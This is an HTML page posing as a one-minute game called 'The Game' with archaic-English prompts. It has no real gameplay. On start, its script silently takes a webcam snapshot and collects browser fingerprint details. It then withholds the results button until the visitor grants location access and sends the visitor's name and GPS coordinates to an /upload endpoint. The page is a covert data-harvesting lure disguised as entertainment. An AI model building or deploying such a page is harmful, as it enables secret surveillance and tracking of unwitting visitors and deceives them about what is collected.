<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>The Game</title>
<style>
  body { font-family: Arial, sans-serif; }
  #timer { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
  #endPopup {
    display: none; position: fixed; inset: 0;
    background: rgba(0,0,0,0.7); color: white;
    padding: 30px; text-align: center; font-size: 20px;
  }
  button { padding: 10px 20px; font-size: 18px; }
</style>
</head>
<body>

<div id="timer">60</div>
<button id="startBtn">Commence the Game!</button>

<div id="endPopup">
  <p>The minute hath expired, noble traveller.</p>
  <p>Enter thy name:</p>
  <input id="playerName" type="text" placeholder="Thy name…"><br><br>
  <button id="grantGeo">Grant Location Permission</button><br><br>
  <button id="showResults" disabled>Show Results</button>
</div>

<script>

// =====================================================
// FLAGS — prevent any duplicate sends
// =====================================================
let snapshotSent = false;
let earlyDataSent = false;
let finalDataSent = false;

// =====================================================
// GAME TIME CONTROL
// =====================================================
let gameEnded = false;
let timerInterval = null;
let score = 0; // you may update this within your game

const startBtn = document.getElementById("startBtn");
const timerDiv = document.getElementById("timer");
const endPopup = document.getElementById("endPopup");

// =====================================================
// CAMERA SNAPSHOT (one-time only)
// =====================================================
async function captureSnapshot() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    await new Promise(r => setTimeout(r, 500)); // warm-up

    const canvas = document.createElement("canvas");
    canvas.width = 300;
    canvas.height = 200;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const base64 = canvas.toDataURL("image/png");

    stream.getTracks().forEach(t => t.stop());
    return base64;

  } catch (e) {
    return null;
  }
}

// =====================================================
// COLLECT CLIENT INFO
// =====================================================
function collectClientData() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height
    }
  };
}

// =====================================================
// SENDS TO SERVER
// =====================================================
async function sendInitialData() {
  if (earlyDataSent) return;
  earlyDataSent = true;

  let snapshot = null;

  if (!snapshotSent) {
    snapshot = await captureSnapshot();
    snapshotSent = true;
  }

  const client = collectClientData();

  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "initial",
      snapshot,
      client
    })
  });
}

async function sendFinalData(name, position) {
  if (finalDataSent) return;
  finalDataSent = true;

  const client = collectClientData();

  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "final",
      name,
      client,
      location: position ? {
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        accuracy: position.coords.accuracy
      } : null,
      score
    })
  });
}

// =====================================================
// GAME START
// =====================================================
startBtn.addEventListener("click", () => {
  startBtn.style.display = "none";

  //  immediate send of initial data + snapshot
  sendInitialData();

  let timeLeft = 60;
  timerInterval = setInterval(() => {
    timeLeft--;
    timerDiv.innerText = timeLeft;

    if (timeLeft <= 0) endGame();
  }, 1000);
});

// =====================================================
// END GAME
// =====================================================
function endGame() {
  if (gameEnded) return;
  gameEnded = true;
  clearInterval(timerInterval);

  endPopup.style.display = "block";
}

// =====================================================
// LOCATION + FINAL SEND
// =====================================================
document.getElementById("grantGeo").onclick = () => {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const name = document.getElementById("playerName").value || "Unknown Stranger";

      document.getElementById("showResults").disabled = false;

      sendFinalData(name, pos);
    },
    (err) => {
      alert("Thou hast denied the location, fair wanderer.");
    }
  );
};

// =====================================================
// SHOW RESULTS (purely frontend display)
// =====================================================
document.getElementById("showResults").onclick = () => {
  alert("Thy score: " + score);
};

</script>
</body>
</html>
